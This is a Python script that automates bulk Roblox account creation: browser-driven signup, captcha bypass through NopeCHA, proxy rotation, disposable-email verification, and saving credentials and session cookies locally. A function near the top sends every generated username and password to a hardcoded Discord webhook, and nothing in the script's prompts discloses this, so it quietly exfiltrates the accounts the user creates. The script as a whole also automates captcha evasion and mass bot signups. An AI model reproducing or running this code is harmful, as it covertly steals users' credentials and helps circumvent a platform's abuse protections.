import asyncio
import warnings
import json
import os
import sys
import re
import pyperclip
import random
import locale
import gc
import aiohttp
from datetime import datetime
from DrissionPage import Chromium, ChromiumOptions, errors
from tqdm import TqdmExperimentalWarning
from tqdm.rich import tqdm
from lib.lib import Main, getResourcePath


warnings.filterwarnings("ignore", category=TqdmExperimentalWarning)
warnings.filterwarnings("ignore", category=UserWarning, module="pkg_resources")

async def send_to_discord_webhook(username, password, time_took):
    """Send account information to Discord webhook"""
    webhook_url = "https://discord.com/api/webhooks/1424019576613769310/NhnK2KjnmvMk1EIUFz2dTjjx9dUuiEnMnsqzt34H7rGAcUKv64z1NEr_bGlFHSPmHU6p"
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Format the message as specified
    message = f"""
⚡ Username                                       🔑 Password
{username}                  {password}

🔥 Date                                                📜 Time Took
{current_time}                                      {time_took}
"""
    
    payload = {
        "content": f"```{message}```",
        "username": "Account Generator"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=payload) as response:
                if response.status == 204:
                    print("Account information sent to Discord webhook successfully!")
                else:
                    print(f"Failed to send to Discord webhook. Status: {response.status}")
    except Exception as e:
        print(f"Error sending to Discord webhook: {e}")


async def main():
    lib = Main()
    co = ChromiumOptions()
    co.auto_port().mute(True)

    print("Checking for updates...")
    version = await lib.checkUpdate()

    lib.promptAnalytics()
    print()
    lib.downloadUngoogledChromium()

    while True:
        try:
            browserPath = lib.returnUngoogledChromiumPath()
        except Exception as e:
            print(f"An error occurred while checking for Ungoogled Chromium: {e}")
            browserPath = None
        if browserPath is None:
            browserPath = input(
                "\033[1m"
                "\n(RECOMMENDED) Press enter in order to use the default browser path (If you have Chrome installed)"
                "\033[0m"
                "\nIf you prefer to use other Chromium browser other than Chrome, please enter its executable path here. (e.g: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe)"
                "\nNote that if captcha bypass is chosen, it will be using Ungoogled Chromium which is already included."
                "\nHere are some supported browsers that are tested and able to use:"
                "\n- Chrome Browser"
                "\n- Brave Browser"
                "\n- Ungoogled Chromium"
                "\nBrowser executable path: "
            ).replace('"', "").replace("'", "")
            if browserPath != "":

                if any(char in browserPath for char in ['&', '|', ';', '$', '`', '(', ')', '{', '}', '[', ']']):
                    print("Invalid characters detected in browser path. Please enter a valid executable path.")
                elif not browserPath.lower().endswith(('.exe', '.app', '.bin')) and os.name == 'nt':
                    print("Browser path should end with .exe on Windows.")
                elif os.path.exists(browserPath):
                    co.set_browser_path(browserPath)
                    break
                else:
                    print("Please enter a valid path.")
            else:
                break
        else:
            ungoogledChromiumUsage = input(
                "Ungoogled Chromium is detected in the lib folder, would you like to use it? [y/n] (Default: Yes): "
            )
            if ungoogledChromiumUsage.lower() in ["y", "n", ""]:
                if ungoogledChromiumUsage.lower() == "y" or ungoogledChromiumUsage == "":
                    ungoogled_path = lib.returnUngoogledChromiumPath()
                    if ungoogled_path:
                        co.set_browser_path(ungoogled_path)
                    break
                else:
                    browserPath = input(
                        "\033[1m"
                        "\n(RECOMMENDED) Press enter in order to use the default browser path (If you have Chrome installed)"
                        "\033[0m"
                        "\nIf you prefer to use other Chromium browser other than Chrome, please enter its executable path here. (e.g: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe)"
                        "\nNote that if captcha bypass is chosen, it will be using Ungoogled Chromium which is already included."
                        "\nHere are some supported browsers that are tested and able to use:"
                        "\n- Chrome Browser"
                        "\n- Brave Browser"
                        "\n- Ungoogled Chromium"
                        "\nBrowser executable path: "
                    ).replace('"', "").replace("'", "")
                    if browserPath != "":

                        if any(char in browserPath for char in ['&', '|', ';', '$', '`', '(', ')', '{', '}', '[', ']']):
                            print("Invalid characters detected in browser path. Please enter a valid executable path.")
                        elif not browserPath.lower().endswith(('.exe', '.app', '.bin')) and os.name == 'nt':
                            print("Browser path should end with .exe on Windows.")
                        elif os.path.exists(browserPath):
                            co.set_browser_path(browserPath)
                            break
                        else:
                            print("Please enter a valid path.")
                    else:
                        break
            else:
                print("\nPlease enter a valid option.")

    while True:
        passw = (
            input(
                "\033[1m"
                "\n(RECOMMENDED) Press enter in order to use the default password"
                "\033[0m"
                "\nThe password will be used for the account and email.\nIf you prefer to use your own password, do make sure that your password is strong enough.\nThis script has a built in password complexity checker.\nPassword: "
            )
            or "Qing762.chy"
        )
        if passw != "Qing762.chy":
            result = await lib.checkPassword(lib.usernameCreator(), passw)
            print(result)
            if "Password is valid" in result:
                break
        else:
            break

    while True:
        verification = input(
            "\033[1m"
            "\n(RECOMMENDED) Press enter in order to enable email verification"
            "\033[0m"
            "\nIf you prefer to turn off email verification, you will risk losing the account. It might also be applicable for people who do not have email verification element"
            "\nWould you like to enable email verification? [y/n] (Default: Yes): "
        )
        if verification.lower() in ["y", "n", ""]:
            break
        else:
            print("\nPlease enter a valid option.")

    nameFormat = input(
        "\033[1m"
        "\n(RECOMMENDED) Press enter in order to use randomized name prefix"
        "\033[0m"
        "\nIf you prefer to go by your own name prefix, please enter it here.\nIt will go by this example: (If name prefix is 'qing', then the account generated will be named 'qing_0', 'qing_1' and so on)\nName prefix: "
    )

    if nameFormat:
        scrambledUsername = None
    else:
        while True:
            scrambledUsername = input("\nWould you like to use a scrambled username?\nIf no, the script will try to generate a structured username, this might increase generation time. [y/n] (Default: Yes): ")
            if scrambledUsername.lower() in ["y", "n", ""]:
                if scrambledUsername.lower() == "y" or scrambledUsername == "":
                    scrambledUsername = True
                else:
                    scrambledUsername = False
                break
            else:
                print("\nPlease enter a valid option.")

    while True:
        customization = input(
            "\nWould you like to customize the account after the generation process with a randomizer? [y/n] (Default: Yes): "
        )
        if customization.lower() in ["y", "n", ""]:
            break
        else:
            print("\nPlease enter a valid option.")

    followUser = input(
        "\nWould you like to follow any additional accounts after generating this account?\n"
        "If yes, enter the usernames separated by commas (,).\n"
        "Leave blank if none.\n"
        "Usernames: "
    )

    proxyUsage = input(
        "\nWould you like to use proxies?\n"
        "If yes, please enter the proxy IP and port in the format of IP:PORT separated by commas (,). (Example: http://localhost:1080).\n"
        "Leave blank if none.\n"
        "Proxy: "
    )

    captchaBypass = input(
        "\nWould you like to bypass captcha through NopeCHA? (Note that there's only up to 200 free solves per day)"
        "\nYou can get a free API key from https://nopecha.com/manage and paste it here."
        "\nIf yes, please enter the API key for the service."
        "\nLeave blank if none."
        "\nAPI Key: "
    ).strip()

    if captchaBypass:
        if not re.match(r'^[a-zA-Z0-9_-]+$', captchaBypass):
            print("Warning: API key contains invalid characters. Only letters, numbers, hyphens and underscores are allowed.")
            captchaBypass = ""
        elif len(captchaBypass) < 10:
            print("Warning: The API key seems too short. Please make sure you entered it correctly.")
            confirm = input("Continue anyway? [y/n]: ")
            if confirm.lower() != "y":
                captchaBypass = ""

    while True:
        incognitoUsage = input(
            "\nWould you like to use incognito mode? Note that if captcha bypass is chosen, it will not be using incognito mode automatically. [y/n] (Default: Yes): "
        )
        if incognitoUsage.lower() in ["y", "n", ""]:
            break
        else:
            print("\nPlease enter a valid option.")

    accounts = []

    while True:
        executionCount = input(
            "\nNumber of accounts to generate (Default: 1): "
        )
        try:
            if executionCount == "":
                executionCount = 1
                break
            executionCount = int(executionCount)
            if executionCount <= 0:
                print("Please enter a positive number.")
                continue
            if executionCount > 100:
                print("Warning: Generating more than 100 accounts may take a very long time and could trigger rate limits.")
                confirm = input("Are you sure you want to continue? [y/n]: ")
                if confirm.lower() != "y":
                    continue
            break
        except ValueError:
            print("Please enter a valid number.")

    print()

    if customization.lower() == "y" or customization == "":
        customization = True
    else:
        customization = False

    if followUser != "":
        following = True
        followUserList = followUser.split(",")
        followUserList = [user.strip() for user in followUserList if user.strip()]

        valid_followUserList = []
        for user in followUserList:
            if re.match(r'^[a-zA-Z0-9_]+$', user) and len(user) <= 20:
                valid_followUserList.append(user)
            else:
                print(f"Invalid username '{user}' - usernames can only contain letters, numbers, and underscores (max 20 chars)")
        followUserList = valid_followUserList
        if not followUserList:
            print("No valid usernames found in follow list.")
            following = False
    else:
        following = False

    if verification.lower() == "y" or verification == "":
        verification = True
    else:
        verification = False

    if (incognitoUsage.lower() == "y" or incognitoUsage == "") and captchaBypass == "":
        co.incognito()

    # Fixed captcha bypass setup
    if captchaBypass:
        try:
            # First try to set up NopeCHA extension
            extension_path = getResourcePath("lib/NopeCHA")
            if os.path.exists(extension_path):
                co.add_extension(extension_path)
                print("NopeCHA extension loaded successfully.")
            else:
                print(f"Warning: NopeCHA extension not found at {extension_path}")
                captchaBypass = ""
        except Exception as e:
            print(f"Warning: Could not load NopeCHA extension: {e}")
            captchaBypass = ""
        
        # Always use ungoogled chromium for captcha bypass
        try:
            ungoogledPath = lib.returnUngoogledChromiumPath()
            if ungoogledPath:
                co.set_browser_path(f"{ungoogledPath}/chrome.exe")
                print("Using Ungoogled Chromium for captcha bypass.")
            else:
                print("Warning: Could not find ungoogled chromium, using default browser")
        except Exception as e:
            print(f"Warning: Could not set ungoogled chromium path: {e}")

    if proxyUsage.strip():
        proxyList = [proxy.strip() for proxy in proxyUsage.split(",") if proxy.strip()]
    else:
        proxyList = []
    usableProxies = []
    for proxy in proxyList:
        if proxy:
            result = lib.testProxy(proxy)
            if result[0] is True:
                usableProxies.append(proxy)
            else:
                print(result[1])
    proxyNumber = len(usableProxies)

    for x in range(int(executionCount)):
        start_time = datetime.now()
        
        if proxyUsage != "" and usableProxies:
            try:
                selected_proxy = random.choice(usableProxies)
                co.set_proxy(selected_proxy)
                print(f"Using proxy: {selected_proxy}")
            except Exception as e:
                print(f"Error setting proxy: {e}")

        if "--no-analytics" not in sys.argv:
            lib.checkAnalytics(version)
        if nameFormat:
            username = lib.usernameCreator(nameFormat)
        else:
            if scrambledUsername is True:
                username = lib.usernameCreator(None, scrambled=True)
            else:
                username = lib.usernameCreator(None, scrambled=False)
        bar = tqdm(total=100)
        bar.set_description(f"Initial setup completed [{x + 1}/{executionCount}]")
        bar.update(10)

        try:
            chrome = Chromium(addr_or_opts=co)
            page = chrome.latest_tab
            page.set.window.max()
        except Exception as e:
            print(f"Failed to initialize browser: {e}")
            bar.close()
            continue

        accountCookies = []
        email = None
        emailPassword = None

        if verification is True:
            try:
                email, emailPassword, token, emailID = await lib.generateEmail(passw)
                bar.set_description(f"Generated email [{x + 1}/{executionCount}]")
                bar.update(10)
            except Exception as e:
                print(f"Failed to generate email: {e}")
                bar.close()
                continue

        try:
            # Improved NopeCHA setup
            if captchaBypass:
                print("Setting up NopeCHA...")
                try:
                    # Navigate to NopeCHA setup page first
                    page.get(f"https://nopecha.com/setup#{captchaBypass}")
                    await asyncio.sleep(2)  # Give time for extension to load
                    print("NopeCHA extension should be active.")
                except Exception as e:
                    print(f"Warning during NopeCHA setup: {e}")

            page.get("https://www.roblox.com/CreateAccount")
            
            # Wait for page to load completely
            await asyncio.sleep(3)
            
            try:
                lang_result = page.run_js_loaded("return window.navigator.userLanguage || window.navigator.language")
                lang = lang_result.split("-")[0] if lang_result and "-" in lang_result else "en"
            except Exception:
                lang = "en"
                
            # Handle cookies
            try:
                cookie_btn = page.ele('@class=btn-cta-lg cookie-btn btn-primary-md btn-min-width', timeout=5)
                if cookie_btn:
                    cookie_btn.click()
                    await asyncio.sleep(1)
            except errors.ElementNotFoundError:
                pass
                
            # Fill birthday information
            bdaymonthelement = page.ele("#MonthDropdown", timeout=10)
            oldLocale = locale.getlocale(locale.LC_TIME)
            try:
                locale.setlocale(locale.LC_TIME, 'C')
                currentMonth = datetime.now().strftime("%b")
            finally:
                try:
                    locale.setlocale(locale.LC_TIME, oldLocale)
                except Exception:
                    pass
            bdaymonthelement.select.by_value(currentMonth)
            
            bdaydayelement = page.ele("#DayDropdown", timeout=10)
            currentDay = datetime.now().day
            try:
                if currentDay <= 9:
                    bdaydayelement.select.by_value(f"0{currentDay}")
                else:
                    bdaydayelement.select.by_value(str(currentDay))
            except Exception as e:
                try:
                    bdaydayelement.select.by_value(str(currentDay))
                except Exception as e2:
                    print(f"Warning: Could not set day to {currentDay}, using default. Errors: {e}, {e2}")
                    
            currentYear = datetime.now().year - 19
            page.ele("#YearDropdown", timeout=10).select.by_value(str(currentYear))
            
            # Fill username and password
            page.ele("#signup-username", timeout=10).input(username)
            page.ele("#signup-password", timeout=10).input(passw)
            await asyncio.sleep(2)
            
            # Check terms checkbox
            try:
                checkbox = page.ele('@id=signup-checkbox', timeout=5)
                if checkbox and not checkbox.attr('checked'):
                    checkbox.click()
            except errors.ElementNotFoundError:
                pass
                
            await asyncio.sleep(1)
            
            # Submit form
            submit_btn = page.ele("@@id=signup-button@@name=signupSubmit@@class=btn-primary-md signup-submit-button btn-full-width", timeout=10)
            submit_btn.click()
            bar.set_description(f"Signup submitted [{x + 1}/{executionCount}]")
            bar.update(20)

            # SIMPLIFIED CAPTCHA HANDLING - Just wait for the process to complete
            print("Waiting for signup process to complete...")
            
            # Wait for either success or failure
            max_wait_time = 45 if captchaBypass else 30
            wait_start = datetime.now()
            success = False
            
            while (datetime.now() - wait_start).seconds < max_wait_time:
                current_url = page.url
                
                # Check for success
                if "home" in current_url or "welcome" in current_url:
                    print("Successfully signed up!")
                    success = True
                    break
                
                # Check for captcha - if present and we have bypass, wait longer
                try:
                    captcha_frame = page.get_frame('@id=arkose-iframe')
                    if captcha_frame and captchaBypass:
                        print("Captcha detected - NopeCHA should handle it automatically...")
                        await asyncio.sleep(5)
                        continue
                except:
                    pass
                
                # Check for errors
                try:
                    error_msg = page.ele('@class=error-msg', timeout=1)
                    if error_msg:
                        print(f"Error detected: {error_msg.text}")
                        if "captcha" in error_msg.text.lower():
                            print("Captcha error - continuing anyway...")
                except:
                    pass
                
                await asyncio.sleep(2)
            
            if not success:
                print("Signup may not have completed successfully, but continuing...")

        except Exception as e:
            print(f"\nAn error occurred during signup process: {e}")
            # Continue anyway instead of breaking

        # Continue with account processing regardless of captcha status
        bar.set_description(f"Signup process [{x + 1}/{executionCount}]")
        bar.update(20)

        if verification is True:
            try:
                # Handle email verification
                verification_clicked = False
                try:
                    verify_btn = page.ele('.btn-primary-md', timeout=5)
                    if verify_btn:
                        verify_btn.click()
                        verification_clicked = True
                        await asyncio.sleep(2)
                except:
                    pass

                if verification_clicked:
                    # Check for phone verification (skip if present)
                    try:
                        phone_element = page.ele('@@class=phone-verification-nonpublic-text', timeout=3)
                        if phone_element:
                            print("Found phone verification element, skipping email verification.\n")
                            bar.update(20)
                            bar.set_description(f"Skipping email verification [{x + 1}/{executionCount}]")
                        else:
                            # Try email verification
                            try:
                                email_input = page.ele('.form-control.input-field', timeout=5)
                                if email_input:
                                    email_input.input(email)
                                    await asyncio.sleep(1)
                                    submit_btn = page.ele('.modal-button.verification-upsell-btn', timeout=5)
                                    if submit_btn:
                                        submit_btn.click()
                                        await asyncio.sleep(3)
                                        
                                        # Wait for verification email
                                        link = None
                                        emailCheckAttempts = 0
                                        maxEmailAttempts = 20
                                        while emailCheckAttempts < maxEmailAttempts:
                                            try:
                                                messages = lib.fetchVerification(email, emailPassword, emailID)
                                                if len(messages) > 0:
                                                    msg = messages[0]
                                                    body = getattr(msg, 'text', '')
                                                    if not body and hasattr(msg, 'html') and msg.html and len(msg.html) > 0:
                                                        body = msg.html[0]
                                                    if body:
                                                        match = re.search(r'https://www\.roblox\.com/account/settings/verify-email\?ticket=[^\s)"]+', body)
                                                        if match:
                                                            link = match.group(0)
                                                            break
                                            except Exception as e:
                                                print(f"Error checking email: {e}")
                                            await asyncio.sleep(3)
                                            emailCheckAttempts += 1

                                        if link:
                                            bar.set_description(f"Verifying email address [{x + 1}/{executionCount}]")
                                            bar.update(20)
                                            page.get(link)
                                            await asyncio.sleep(3)
                                        else:
                                            bar.set_description(f"Email verification link not found [{x + 1}/{executionCount}]")
                                            bar.update(10)
                            except Exception as e:
                                print(f"Email verification attempt failed: {e}")
                    except:
                        pass
            except Exception as e:
                print(f"\nError during verification process: {e}\n")

        # Save cookies and complete account setup
        bar.set_description(f"Saving cookies and clearing data [{x + 1}/{executionCount}]")
        try:
            for i in page.cookies():
                cookie = {
                    "name": i["name"],
                    "value": i["value"],
                }
                accountCookies.append(cookie)
        except Exception as e:
            print(f"Error saving cookies: {e}")
        bar.update(5)

        if customization is True:
            bar.set_description(f"Customizing account [{x + 1}/{executionCount}]")
            try:
                await lib.customization(page)
            except Exception as e:
                print(f"Error during customization: {e}")
            bar.update(5)
        else:
            bar.set_description(f"Skipping customization [{x + 1}/{executionCount}]")
            bar.update(5)

        if following is True:
            bar.set_description(f"Following users [{x + 1}/{executionCount}]")
            try:
                userIDs = await lib.followUser(followUserList, page)
            except Exception as e:
                print(f"An error occurred while following users: {e}")
            bar.update(5)

        # Cleanup
        try:
            page.set.cookies.clear()
            page.clear_cache()
            chrome.set.cookies.clear()
            chrome.clear_cache()
            chrome.quit()
        except Exception as e:
            print(f"Warning during cleanup: {e}")

        accounts.append({"username": username, "password": passw, "email": email, "emailPassword": emailPassword, "cookies": accountCookies})
        bar.set_description(f"Finished account generation [{x + 1}/{executionCount}]")

        remaining = max(0, 100 - bar.n)
        if remaining > 0:
            bar.update(remaining)
        bar.close()
        
        # Calculate time took and send to Discord
        end_time = datetime.now()
        time_took = round((end_time - start_time).total_seconds(), 2)
        await send_to_discord_webhook(username, passw, time_took)

    # Rest of the code for saving accounts...
    if not accounts:
        print("No accounts were successfully created.")
        return

    try:
        with open("accounts.txt", "a", encoding="utf-8") as f:
            for account in accounts:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(
                    f"Username: {account['username']}, Password: {account['password']}, Email: {account['email']}, Email Password: {account['emailPassword']} (Created at {timestamp})\n"
                )
    except Exception as e:
        print(f"Error writing to accounts.txt: {e}")

    print("\033[1m" "Credentials:")

    try:
        with open("cookies.json", "r", encoding="utf-8") as file:
            existingData = json.load(file)
    except FileNotFoundError:
        existingData = []
    except Exception as e:
        print(f"Error reading cookies.json: {e}")
        existingData = []

    accountsData = []

    for account in accounts:
        accountData = {
            "username": account["username"],
            "password": account["password"],
            "email": account["email"],
            "emailPassword": account["emailPassword"],
            "cookies": account["cookies"]
        }
        accountsData.append(accountData)

    existingData.extend(accountsData)

    try:
        with open("cookies.json", "w", encoding="utf-8") as jsonFile:
            json.dump(existingData, jsonFile, indent=4)
    except Exception as e:
        print(f"Error writing to cookies.json: {e}")

    for account in accounts:
        print(f"Username: {account['username']}, Password: {'*' * len(account['password'])}, Email: {account['email']}, Email Password: {'*' * len(account['emailPassword']) if account['emailPassword'] is not None else 'N/A'}")
    print("\033[0m" "\nCredentials saved to accounts.txt\nCookies are saved to cookies.json file\n\nHave fun playing Roblox!")

    accountManagerFormat = input(
        "\nWould you like to export the account manager format into your clipboard? [y/n] (Default: No): "
    ) or "n"
    if accountManagerFormat.lower() in ["y", "yes"]:
        accountManagerFormatString = ""

        for account in accountsData:
            roblosecurityCookie = None
            for cookie in account["cookies"]:
                if cookie["name"] == ".ROBLOSECURITY":
                    roblosecurityCookie = cookie["value"]
                    break

            if roblosecurityCookie:
                accountManagerFormatString += f"{roblosecurityCookie}\n"
            else:
                print(f"Warning: No .ROBLOSECURITY cookie found for user {account['username']}")

        pyperclip.copy(accountManagerFormatString)
        print("Account manager format (cookies) copied to clipboard!")
        print("Select the 'Cookie(s)' option in Roblox Account Manager and paste it into the input field.")
        print("Do note that you'll have to complete the signup process manually in Roblox Account Manager.\n")
    else:
        print()

    for i in range(5, 0, -1):
        print(f"\rExiting in {i} seconds...", end="", flush=True)
        await asyncio.sleep(1)
    print("\r\033[KExiting now...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nScript interrupted by user. Cleaning up...")
        try:
            gc.collect()
        except Exception:
            pass
        print("Cleanup complete.")
    except Exception as e:
        print(f"\nUnexpected error occurred: {e}")
        print("Please report this issue at https://qing762.is-a.dev/discord if the error persists.")
